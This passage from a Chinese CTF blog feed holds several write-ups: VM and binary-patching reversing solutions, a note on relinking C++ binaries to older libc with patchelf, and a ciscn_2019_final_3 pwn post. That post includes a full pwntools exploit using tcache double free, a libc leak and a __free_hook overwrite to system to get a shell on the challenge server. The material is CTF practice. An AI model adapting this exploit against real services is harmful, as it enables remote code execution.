char数组和一个char变量v4，然后其它的都是int变量了，一开始对4给int变量都初始化0了，大概率是做一个下标的。然后char数组应该是输入的flag，至于v4变量猜测可能是做一个中间数的，就相当于寄存器一样。</p><p>接下来看看这五个int变量干嘛的。</p><p>先是v9，发现它在每一个case当中都有+1或者+2。就很像我们的ip寄存器，每执行一次指令都往后移，然后这里+1+2应该是某些指令有操作数，导致指令宽度为2，那么v9就是指向当前指令的。而且循环退出条件就是v9&gt;=a2，a2是整个指令的长度。</p><p>其次v8,v8在所有指令中基本都是做str数组的下标，并且做下标的时候，str[v8]都是做源操作数，并且只在1号指令中有自增操作。</p><p>然后v7，这个很简单，只在7号指令中存在，并且做str[100+v7]这样的下标，然后和后一个操作数作比较，如果不等那么退出，那这个就应该是比较指针，7号指令应该是作比较的指令。大概率会做一个运算，运算结果就是str[100]往后的位置的变量。</p><p>接下来看看v6，只在1号指令中出现，并且是以str[100+v6]这样的下标，作为目的操作数。那这个大概率就是做一个变换然后运算结果保存到str[100]开始往后的位置。</p><p>最后一个是v5，只在8号指令出现，作用是取出v4的值保存在str[v5]中。这个v4我们前面分析就大概率是一个普通的寄存器，这里相当于就是取寄存器中的数还给内存一样的。</p><p>那么这些都了解之后就可以很轻松地写出指令的作用了，如下。</p><p><img src="/2021/11/03/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84%20singal%20writeup/2.png" alt="2"></p><p>接下来就手动解析指令，这个指令编码比较简单，无非就是从头开始，遇到2，3，4，5，7就取出后一个数一起与他编码，否则单独作为一个指令编码。</p><p>这个其实可以做程序算的，但是为了一开始理解方便，我也还是手算了。可以发现比较指令都集中在最后了，那么我们从头开始分析。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">10      //读取数据</span><br><span class="line">4,16    //取出str[0]^16---&gt;rax</span><br><span class="line">8       //rax---&gt;str[0]</span><br><span class="line">//str[0]^=16;</span><br><span class="line">3,5     //取出str[0]-5---&gt;rax</span><br><span class="line">1       //rax---&gt;str[100]</span><br><span class="line">//str[100]=str[0]-5;</span><br><span class="line">//根据后面的比较str[100]=34，所以(str[0]^16)-5==34</span><br><span class="line">//str[0]=55=&#x27;7&#x27;</span><br></pre></td></tr></table></figure><p>很容易算出来了str[0]=’7’。剩下的同理，因为位之间比较独立，并且它有一定规律，手撸还是很块就出来了的。</p><p>下面给出我做这个用的草稿。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line">10      //读取数据</span><br><span class="line">4,16    //取出str[0]^16---&gt;rax</span><br><span class="line">8       //rax---&gt;str[0]</span><br><span class="line">//str[0]^=16;</span><br><span class="line">3,5     //取出str[0]-5---&gt;rax</span><br><span class="line">1       //rax---&gt;str[100]</span><br><span class="line">//str[100]=str[0]-5;</span><br><span class="line">//根据后面的比较str[100]=34，所以(str[0]^16)-5==34</span><br><span class="line">//str[0]=55=&#x27;7&#x27;</span><br><span class="line">4,32    //str[1]^32---&gt;rax</span><br><span class="line">8       //rax---&gt;str[1]</span><br><span class="line">//str[1]^=32;</span><br><span class="line">5,3     //str[1]*3---&gt;rax</span><br><span class="line">1       //rax---&gt;str[1]</span><br><span class="line">//str[101]=(str[1]^32)*3</span><br><span class="line">//str[101]=63</span><br><span class="line">//str[1]=53=&#x27;5&#x27;</span><br><span class="line">3,2     </span><br><span class="line">8       //str[2]-=2;</span><br><span class="line">11</span><br><span class="line">1       //str[102]=str[2]-1;</span><br><span class="line">//str[2]-3=52</span><br><span class="line">//str[2]=55=&#x27;7&#x27;</span><br><span class="line">12</span><br><span class="line">8       //str[3]+=1;</span><br><span class="line">4,4</span><br><span class="line">1       //str[103]=str[3]^4;</span><br><span class="line">//(str[3]+1)^4=50</span><br><span class="line">//str[3]=55=&#x27;5&#x27;</span><br><span class="line">5,3</span><br><span class="line">8       //str[4]*=3;</span><br><span class="line">3,33 </span><br><span class="line">1       //str[104]=str[4]-33;</span><br><span class="line">//(str[4]*3)-33=114</span><br><span class="line">//str(4)=49=&#x27;1&#x27;</span><br><span class="line">11</span><br><span class="line">8</span><br><span class="line">11</span><br><span class="line">1</span><br><span class="line">//str[5]-2=51</span><br><span class="line">//str[5]=53=&#x27;5&#x27;</span><br><span class="line">4,9</span><br><span class="line">8       //str[6]^=9;</span><br><span class="line">3,32</span><br><span class="line">1       //str[6]-=32;</span><br><span class="line">//(str[6]^9)-32=24</span><br><span class="line">//str[6]=49=&#x27;1&#x27;</span><br><span class="line">2,81    </span><br><span class="line">8       //str[7]+=81;</span><br><span class="line">4,36</span><br><span class="line">1       //str[7]^=36;</span><br><span class="line">//(str[7]+81)^36=-89;</span><br><span class="line">//str[7]=50=&#x27;2&#x27;</span><br><span class="line">12</span><br><span class="line">8       str[8]+=1;</span><br><span class="line">11</span><br><span class="line">1       str[8]-=1;</span><br><span class="line">str[8]=49=&#x27;1&#x27;</span><br><span class="line">5,2</span><br><span class="line">8       //str[9]*=2;</span><br><span class="line">2,37</span><br><span class="line">1       //str[9]+=37;</span><br><span class="line">//str[9]*2+37=-15</span><br><span class="line">//str[9]=102=&#x27;f&#x27;</span><br><span class="line">2,54</span><br><span class="line">8       //str[10]+=54;</span><br><span class="line">4,65</span><br><span class="line">1       //str[10]^=65;</span><br><span class="line">//(str[10]+54)^65=40</span><br><span class="line">//str[10]=51=&#x27;3&#x27;</span><br><span class="line">2,32</span><br><span class="line">8       //str[11]+=32;</span><br><span class="line">5,1</span><br><span class="line">1       //</span><br><span class="line">//str[11]+32=-124</span><br><span class="line">//str[11]=100=&#x27;d&#x27;</span><br><span class="line">5,3</span><br><span class="line">8       //str[12]*=3;</span><br><span class="line">2,37</span><br><span class="line">1       //str[12]+=37;</span><br><span class="line">//str[12]*3+37=-63</span><br><span class="line">//str[12]=52=&#x27;4&#x27;</span><br><span class="line">4,9     //str[13]^=9;</span><br><span class="line">8</span><br><span class="line">3,32    //str[13]-=32;</span><br><span class="line">1</span><br><span class="line">//(str[13]^9)-32=30;</span><br><span class="line">//str[13]=53=&#x27;7&#x27;</span><br><span class="line">2,65</span><br><span class="line">8       //str[14]+=65;</span><br><span class="line">12</span><br><span class="line">1       //str[14]++;</span><br><span class="line"></span><br><span class="line">//str[14]=56=&#x27;8&#x27;</span><br><span class="line">比较：</span><br><span class="line">7,34,7,63,7,52,7,50</span><br><span class="line">7,114,7,51,7,24</span><br><span class="line">7,-89,7,49,7,-15</span><br><span class="line">7,40,7,-124,7,-63</span><br><span class="line">7,30,7,122</span><br></pre></td></tr></table></figure><p>最后得出这个15位的key就是757515121f3d478 。这个程序基本用不到动态调试，最后就算要跑也只是检验我们的flag是否正确而已，那么我们跑一遍吧。</p><p><img src="/2021/11/03/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84%20singal%20writeup/3.png" alt="3"></p><p>最终提交的flag就是flag{757515121f3d478}</p><p>这题目在vmre中还是比较简单的，推荐入坑虚拟机逆向的师傅一定做做这个，然后自己粗心居然把11和12指令搞反了一开始，导致算出来的就一直不对，这个毛病还是得改改(捂脸</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> re </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>WUSTCTF2020 level4 writeup</title>
      <link href="/2021/11/02/WUSTCTF2020%20level4%20writeup/"/>
      <url>/2021/11/02/WUSTCTF2020%20level4%20writeup/</url>
      
        <content type="html"><![CDATA[<p>好久没刷re了，来刷点re啊。</p><span id="more"></span><p>buuctf的<a href="https://buuoj.cn/challenges#[WUSTCTF2020]level4">[WUSTCTF2020]level4</a></p><h2 id="静态分析文件"><a href="#静态分析文件" class="headerlink" title="静态分析文件"></a>静态分析文件</h2><p>下载发现是一个64位的elf文件，IDA打开分析。照例先看看明显的字符串明文，发现有left，right，然后还有三种打印(type1,type2,type3)。观察符号列表发现有type1和type2函数。跟进去发现跟我们二叉树的递归输出十分相似，并且type1 先递归了a1+1再递归a1+2，差不多他们就是左子树和右子树。那么type1就是一个后根遍历。然后type2是再中间输出的，是一个中根遍历，那么type3大概率就应该是先根遍历，这里他没有，那么先根遍历大概率就是flag。根据中序遍历和其它一个遍历可以求另外一个遍历，这个在数据结构课里有讲。</p><h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><p>那么先运行一遍可以发现得到了两个结果</p><p><img src="/2021/11/02/WUSTCTF2020%20level4%20writeup/1.png" alt="1"></p><p>正解显然就是考一个数据结构嘛，但是一个题目总得有多种解法，这里我选择修改函数结构，让它从一个后序遍历变成先序遍历，这里需要patch elf我们先找到type2函数观察它的汇编代码</p><p><img src="/2021/11/02/WUSTCTF2020%20level4%20writeup/2.png" alt="2"></p><p>很明显</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jz      short loc_4007FD</span><br></pre></td></tr></table></figure><p>这一条指令对应了if (*a1)的跳转，那么一直到最后的call putchar之前应该都是if范围内的东西，这里需要注意的是，函数调用要把之前的一切准备都算进来。定位找到字节码，然后交换位置，将开头到第二个call type2的指令和之后的到putchar指令对换位置，然后patch上去即可。</p><p>满心欢喜patch之后却发现没有得到想要的结果，为什么呢？</p><p>这里需要理解一下jmp跳转指令了，call和jmp两个指令实际上都属于无条件跳转指令，为什么加以区分呢，call它在跳转之后一定会有一个返回的动作，而jmp则不需要。如果自己去尝试编码的话就会发现它的编码开头都是E8 +4个字节定位代码位置。然后它是怎么定位的呢？首先E8开始，之后四个字节为小端表示这条指令(jmp xxx)的下一条指令的位置到 目标代码地址位置的差值(后者减前者)。举个例子，比如我有如下的机器代码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">nop  90//1</span><br><span class="line">nop  90//2</span><br><span class="line">nop  90//3</span><br><span class="line">nop  90//4</span><br><span class="line">jmp xxx E8 ?? ?? ?? ??//5</span><br><span class="line">nop  90//6</span><br><span class="line">nop  90//7</span><br><span class="line">nop  90//8</span><br></pre></td></tr></table></figure><p>当编码的4个字节都为00时，那么这条jmp指令的跳转位置就是第六条指令。</p><p>如果为01 00 00 00时，那么这条指令跳转的位置是第七条指令。</p><p>如果为02 00 00 00时，那么这条指令跳转的位置是第8条指令。</p><p>以此类推，注意里面的数值表示字节，而不是指令的数目，如果想往回挑，那么则需要用相应负数的补码表示偏移。</p><p>讲完这些之后就能理解为什么简单的交换代码位置会导致patch失败了，因为指令的地址改变了，所以原来这么多偏移量它已经对应不上相应的函数了。因此需要自己手动操作一下，调整call指令的偏移使之成功patch，这里建议使用keypatch插件，在更改这条指令只需直接输入call 地址，则可以快速完成patch，不用自己算偏移编码。</p><p><img src="/2021/11/02/WUSTCTF2020%20level4%20writeup/3.png" alt="3"></p><p>可以看到代码逻辑按照我们预期的方向更改了，那么我们跑一下，直接输出flag。</p><p><img src="/2021/11/02/WUSTCTF2020%20level4%20writeup/4.png" alt="4"></p><p>flag: wctf2020{This_IS_A_7reE}</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> re </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ciscn2019_final_3 writeup</title>
      <link href="/2021/11/01/ciscn2019_final_3%20writeup/"/>
      <url>/2021/11/01/ciscn2019_final_3%20writeup/</url>
      
        <content type="html"><![CDATA[<p>buu刷题记录：<a href="https://buuoj.cn/challenges#ciscn_2019_final_3">ciscn_final_3</a></p><span id="more"></span><h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>今天解决了C++文件换版本的问题，也是一刻没耽误直接做了这道C++题目，不得不说太爽了啊，再也不用因为题目是C++写的就做不了了，话不多说来看文件。</p><h2 id="静态分析elf文件"><a href="#静态分析elf文件" class="headerlink" title="静态分析elf文件"></a>静态分析elf文件</h2><p>题目告知是ubuntu18版本的，给了libc.so.6文件，但是盲猜跟它自己的一样，那就先换好elf文件的版本。checksec观察保护全开。然后IDA打开一看，发现是经典的堆菜单题，提供了两种操作，add和delete。delete很明显free之后指针没有清零，存在UAF漏洞，并且add只允许下标开到0x18，也就是0~24总共能add 25次。然后大小限制在了fastbin大小的范围内，但是很贴心地，每次add之后给了malloc之后的地址。那么大概率通过这里泄露（ps:一开始并没有想到，还想着用IO泄露来着的），思路大概是先通过一次double free修改一个chunk的size为其它大小，然后free一次，再修改成非fastbin范围的堆块，并且防止堆块放入unsortedbin被check fail，最好不要构造堆相互重叠(这句话的意思差不多就是尽量让小堆块完全被大堆块包含，因为它会检测next chunk的)。然后出来了libc的地址之后准备好之前被free的堆块，add添加之后libc地址落入tcache中，再次add泄露这个地址，然后就很简单了，double free劫持free_hook为system函数，再free一个带有/bin/sh字符串的堆块即可getshell。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conn</span>(<span class="params">x,file_name,port</span>):</span></span><br><span class="line">    <span class="keyword">if</span> x:</span><br><span class="line">        p=process(file_name)</span><br><span class="line">        libc=ELF(<span class="string">&#x27;./libc/libc-2.27-64.so&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,port)</span><br><span class="line">        libc=ELF(<span class="string">&#x27;./libc/libc-2.27-buu64.so&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> ELF(file_name),libc,p</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,size,payload</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice &gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;size&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;something&#x27;</span>,payload)</span><br><span class="line">    <span class="keyword">if</span> index==<span class="number">11</span>:<span class="keyword">return</span> </span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">    <span class="comment">#if index==11:gdb.attach(p)</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(p.recvline()[:-<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice &gt;&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">elf,libc,p=conn(<span class="number">0</span>,<span class="string">&#x27;./ciscn_final_3&#x27;</span>,<span class="number">28019</span>)</span><br><span class="line">heap_addr=add(<span class="number">0</span>,<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>+p64(<span class="number">0</span>))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">success(<span class="string">&#x27;heap_addr:&#x27;</span>+<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#double free保存一个free的0x30堆块在0号堆块位置</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x18</span>,p64(heap_addr-<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x18</span>,<span class="string">b&#x27;/bin/sh\0&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x18</span>,<span class="string">b&#x27;\0&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0x31</span>))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#free(0)</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x78</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x78</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x78</span>,p64(heap_addr-<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x78</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x78</span>,p64(<span class="number">0</span>)+p64(<span class="number">0xa1</span>))<span class="comment">#构造非fastbin大小的堆块</span></span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x38</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):<span class="comment">#填满tcache 使其落入unsorted bin</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x28</span>,<span class="string">b&#x27;aa&#x27;</span>)</span><br><span class="line">libc_addr=add(<span class="number">10</span>,<span class="number">0x28</span>,<span class="string">b&#x27;\0&#x27;</span>)-<span class="number">0x3ebca0</span><span class="comment">#泄露libc地址</span></span><br><span class="line">success(<span class="string">&#x27;libc_addr:&#x27;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line"></span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x60</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">free(<span class="number">11</span>)</span><br><span class="line">free(<span class="number">11</span>)</span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x60</span>,p64(libc_addr+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]))<span class="comment">#劫持freehook</span></span><br><span class="line">add(<span class="number">13</span>,<span class="number">0x60</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">14</span>,<span class="number">0x60</span>,p64(libc_addr+libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">add(<span class="number">15</span>,<span class="number">0x18</span>,<span class="string">b&#x27;/bin/sh\0&#x27;</span>)</span><br><span class="line">free(<span class="number">15</span>)<span class="comment">#getshell</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>关于C++文件换libc版本的问题</title>
      <link href="/2021/11/01/%E5%85%B3%E4%BA%8EC++%E6%96%87%E4%BB%B6%E6%8D%A2libc%E7%89%88%E6%9C%AC%E7%9A%84%E9%97%AE%E9%A2%98/"/>
      <url>/2021/11/01/%E5%85%B3%E4%BA%8EC++%E6%96%87%E4%BB%B6%E6%8D%A2libc%E7%89%88%E6%9C%AC%E7%9A%84%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>今天解决了一件困扰了我很久的事情，那就是对于elf文件的patch。以前我在做pwn题的时候，遇到C++文件总是束手无策。</p><span id="more"></span><p>在换过对应的版本之后，libc总是报错。就如下面这张图片</p><p><img src="/2021/11/01/%E5%85%B3%E4%BA%8EC++%E6%96%87%E4%BB%B6%E6%8D%A2libc%E7%89%88%E6%9C%AC%E7%9A%84%E9%97%AE%E9%A2%98/1.png" alt="1"></p><p>在此问了肥猫师傅给我的解决办法，解决办法很早就给了我的，但是我到现在才搞明白，弄懂,下面是肥猫师傅的原话。</p><p><img src="/2021/11/01/%E5%85%B3%E4%BA%8EC++%E6%96%87%E4%BB%B6%E6%8D%A2libc%E7%89%88%E6%9C%AC%E7%9A%84%E9%97%AE%E9%A2%98/2.png" alt="2"></p><p>在此之前我一直都是用patchelf封装的脚本加上glibc all in one配合完美换libc版本，对于C程序是没有任何问题的。但是C++出现了问题，那么我们就先看看C和C++编译链接之后出来的文件的依赖库的结构。</p><p>那么为了测试就先写出两个版本的hello world程序。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//C</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello world\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//C++</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;Hello world&quot;</span>&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分别用gcc和g++命令编译得到1和2可执行文件。</p><p>查看动态链接的关系。</p><p><img src="/2021/11/01/%E5%85%B3%E4%BA%8EC++%E6%96%87%E4%BB%B6%E6%8D%A2libc%E7%89%88%E6%9C%AC%E7%9A%84%E9%97%AE%E9%A2%98/3.png" alt="3"></p><p>可以看到C++程序多了三项依赖，查一下自己glibc all in one libs中找得到一下依赖项</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">libc.so.6</span><br><span class="line">libm.so.6</span><br><span class="line">ld.so.6</span><br></pre></td></tr></table></figure><p>我们换库的原因是因为malloc的分配以及各个函数在libc中的偏移在不同版本中都有着很大的区别，偏移问题不大，只需要在本地打出之后连接远程靶机的时候替换一下自己的libc即可。但是在打堆题的时候，不同libc分配有本质区别，比如，2.27的tcache允许直接double free，但是2.23和2.29之后都不允许直接的double free。以及2.34 的libc 中很多hook已经被删除，并不能利用。总之，在打堆题的时候版本是一个很重要的东西，不同版本利用手段都会有本质区别的。</p><p>我们patchelf的时候一般是指定链接器，然后再指定runpath到我们自己下载的库文件。那我们把这两个项换上2.23的libc之后ldd看看他们的依赖关系。</p><p><img src="/2021/11/01/%E5%85%B3%E4%BA%8EC++%E6%96%87%E4%BB%B6%E6%8D%A2libc%E7%89%88%E6%9C%AC%E7%9A%84%E9%97%AE%E9%A2%98/4.png" alt="2"></p><p>可以看到两个文件都已经换上了2.23版本的libc，但是C++编译出来的文件出现了报错，报错是在我们换上的libc.so.6中报出的，然后报错的提醒是因为这个libstdc++.so.6。那么就可以确定一点了，c++自己额外提供了库，而这个库是libstdc++.so.6，而这一项指定到了我们系统的/lib/x86_64-linux-gnu/libstdc++.so.6这个库文件中，而这个库文件是对应了我们安装的版本的，因此我们需要去找一找2.23版本的这个C++的库，并且patch之后指向那个库应该就可以解决。这里可以学肥猫师傅的做法，先用docker装一个16版本的ubuntu，因为16版本刚好对应了libc的版本2.23。</p><p>这里先去用docker拉一个ubuntu16.04的镜像然后用如下命令进入这个镜像。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#docker run -it ubuntu:16.04 /bin/bash</span><br></pre></td></tr></table></figure><p>进入之后装上g++和vim，用vim写一个hello world 并且编译之后ldd查看文件依赖关系，找到libstdc++.so.6指向的具体路径然后用docker cp命令拷贝到自己目录下，然后建议丢进libs目录，此时为C++文件再加一个patchelf命令，我这里用了如下命令，自己看情况改改路径即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$patchelf --replace-needed libstdc++.so.6 &#x27;/home/xiaoji233/pwn-tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libstdc++.so.6.0.21&#x27;  filename</span><br></pre></td></tr></table></figure><p>那么，改完了之后我们ldd看看情况。</p><p><img src="/2021/11/01/%E5%85%B3%E4%BA%8EC++%E6%96%87%E4%BB%B6%E6%8D%A2libc%E7%89%88%E6%9C%AC%E7%9A%84%E9%97%AE%E9%A2%98/5.png" alt="5"></p><p>可以看到libstdc++.so.6已经指向了我们所给的库，并且也没有上面两行的报错了，因此这样就完成了一个C++程序的版本更换。</p><p>最后我们运行看看。</p><p><img src="/2021/11/01/%E5%85%B3%E4%BA%8EC++%E6%96%87%E4%BB%B6%E6%8D%A2libc%E7%89%88%E6%9C%AC%E7%9A%84%E9%97%AE%E9%A2%98/6.png" alt="6"></p><p>完美成功运行。</p><h2 id="总结"><a href="#总结" class="headerlink" 